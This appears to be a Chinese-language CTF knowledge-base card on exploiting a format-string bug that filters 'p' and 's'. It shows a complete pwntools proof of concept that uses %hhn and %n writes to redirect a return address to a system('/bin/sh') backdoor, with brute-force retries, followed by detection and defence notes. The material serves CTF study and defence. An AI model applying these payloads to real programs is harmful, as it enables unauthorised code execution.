---
id: binary-pwn-format-string-filtered-p-s-hhn-rbp-chain-backdoor
title: 过滤 p/s 的格式化字符串：%c/%hhn 改栈上 rbp 链低字节，%n 覆写返回地址到后门（1/16 爆破）
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-filter-p-s-hhn-rbp-chain-backdoor
tags:
- pwn
- format-string
- hhn
- partial-overwrite
- stack
- return-address
- backdoor
- brute-force
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V532
  verified_at: '2026-11-11T17:13:35+08:00'
  notes: 已对照原文13198与截图核对：vuln()中read(s,0x50)+strchr过滤p/s后printf(s)（img29/32），后门sys()=system("/bin/sh")（img31），payload %104c%18$hhn + %<0x40123d-0x68>c%22$n与原文exp一致；1/16来源按原文『栈地址倒数第二位有16种可能』修正为bits 4–7半字节（原卡误写bits 8–11）。与既有栈指针链卡（%p泄栈+%hn）在过滤条件与写原语上不同，非同链。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-filtered-p-s-hhn-rbp-chain-backdoor/
draft: false
kb_aliases:
- 过滤 p s 的格式化字符串
- 不能用 %p %s 的 fmt
- '%hhn 改栈地址'
- rbp 链改返回地址
- 格式化字符串打后门
- HGAME2024 ezfmt string
---

## 一句话结论

当程序把输入直接 `printf(buf)` 但过滤了字符 `p` 与 `s`（`%p`/`%s` 不可用）时，仍可用位置参数 + `%c`/`%hhn`/`%n`：先用 `%18$hhn` 把一个栈槽的低字节改成 `0x68`，使其指向保存的返回地址（经 rbp 链），再用 `%22$n` 把累计输出数 `0x40123d` 写到该返回地址，跳转到同程序内的 `system("/bin/sh")` 后门；由于栈地址低 16 位有 16 种页内偏移，成功率约 1/16，需循环重试。

## 原理

- **漏洞形态**：`vuln()` 中 `char s[88]; read(0, s, 0x50uLL); if (!strchr(s,'p') && !strchr(s,'s')) printf(s);`。长度 0x50 不溢出，但把输入当格式串，构成格式化字符串漏洞；过滤只检查小写 `p` 和 `s`，`%`、数字、`$`、`c`、`n`、`h` 均可用。
- **%n 的写入语义**：`%k$n` 把“目前已输出字符数”写入第 k 个参数槽中的地址；`%k$hhn` 只写低 1 字节。位置参数 `$` 不依赖栈上参数顺序，便于在短输入里精确选中槽位。
- **为什么先写 0x68**：程序栈上某个参数槽保存的是指向栈内某处的指针（与 rbp 链相关）。其低字节随 ASLR 变化；用 `%18$hhn` 把该指针低字节改成 `0x68`，使它正好指向保存的返回地址所在的栈槽。这一步只改 1 字节，但能否命中目标槽取决于原始指针倒数第二个十六进制位（bits 4–7）的取值；该半字节受栈对齐/ASLR 偏移影响有 16 种可能（原文：栈地址倒数第二位有 16 种可能），因此成功率约 1/16。
- **再写返回地址**：`%<0x40123d-0x68>c%22$n` 先把已输出字符数补到 `0x40123d`，再用 `%22$n` 把该 4 字节值写到第 22 个参数槽——经过上一步修改后，该槽已指向返回地址。返回地址被改成后门 `sys()`（`system("/bin/sh")`）的地址 0x40123d，函数返回时直接拿 shell。
- **为什么用 `%n` 而不是 `%hn`**：`%n` 一次写 4 字节即可覆盖 64 位地址的低 32 位（高 32 位原本为 0）；若用 `%hn` 需要构造更多输出，且不一定能覆盖完整地址。`%hhn` 用于单字节指针调整，`%n` 用于最终地址写入，两者配合把输入长度控制在 0x50 以内。
- **1/16 的由来**：栈地址按 16 字节对齐，低 4 位固定为 0，倒数第二个十六进制位（bits 4–7）随栈随机化偏移有 16 种可能；只有低字节被改成 0x68 后恰好落在保存返回地址的目标槽时才成功，失败通常崩溃，重连再试。

## 触发条件

- 64 位、无 PIE（后门地址 0x40123d 固定）、无 canary 或 canary 不影响（不溢出）。
- 程序存在 `printf(user_input)` 且过滤仅覆盖部分格式字符（本例禁用 `p`/`s`）。
- 二进制内有可直接 getshell 的后门函数（`system("/bin/sh")`）。
- 允许攻击者多次重连（1/16 成功率）。

## 利用步骤

1. 确认过滤字符：输入含 `p` 或 `s` 会被拒绝，含 `%`、`$`、数字、`c`、`h`、`n` 可通过。
2. 用 `%18$hhn` 把栈槽低字节改成 `0x68`：payload 第一部分为 `%104c%18$hhn`（104=0x68）。
3. 用 `%22$n` 把返回地址写成后门：第二部分为 `%<0x40123d-0x68>c%22$n`。
4. 拼接发送；若进程崩溃则重连重试（约 1/16 成功），成功后函数返回进入 `sys()` 拿到 shell。
5. 用 `echo id` / `cat flag` 验证。

## PoC

```python
from pwn import *
context.arch = 'amd64'

for _ in range(32):  # 1/16，循环重试
    try:
        p = process('./pwn')
        p.recvuntil(b'the shit is ezfmt, M3?\n')
        pl  = b'%' + str(0x68).encode() + b'c%18$hhn'
        pl += b'%' + str(0x40123d - 0x68).encode() + b'c%22$n'
        p.sendline(pl)
        p.sendline(b'echo PWNED; id')
        out = p.recv(timeout=1)
        if b'PWNED' in out:
            print(out)
            p.interactive()
            break
        p.close()
    except EOFError:
        continue
```

后门（原文）：

```c
int sys() { return system("/bin/sh"); }   // 0x40123d
```

## 变体与关联

- **过滤变体**：若只过滤 `%p` 而放行 `%s`，可先用 `%s` 泄 libc/栈；若过滤 `n`，则需改用 `%s` 读取或其它写原语。
- **栈指针链变体**：允许 `%p` 时可用 `%10$p` 先泄栈地址再 `%hn` 精确写返回地址，见 [[binary-pwn-format-string-stack-pointer-chain-return-address-backdoor]]。
- **过滤绕过**：格式化字符串的编码/过滤绕过见 [[binary-pwn-format-string-decode-after-filter-bypass]]；单次 `%n` 双写/低字节 trampoline 见 [[binary-pwn-format-string-single-shot-dual-write-hhn-low-byte-trampoline]]。
- **边界**：PIE 会让后门地址随机化，需先泄代码基址；Full RELRO 不影响栈上返回地址写；canary 只防溢出，不防格式化字符串写。

## 检测与防御

- **检测/审计**：源码中出现 `printf(buf)`/`fprintf(f, buf)` 且 buf 来自用户输入；过滤函数只黑名单 `p`/`s` 等少量字符；二进制中存在 `system("/bin/sh")` 后门。
- **防御**：始终使用 `printf("%s", buf)` 或 `fputs`；启用 `-D_FORTIFY_SOURCE=2`、PIE、Full RELRO；移除生产二进制中的调试后门；对格式化字符串漏洞做静态扫描（格式串参数非字面量）。
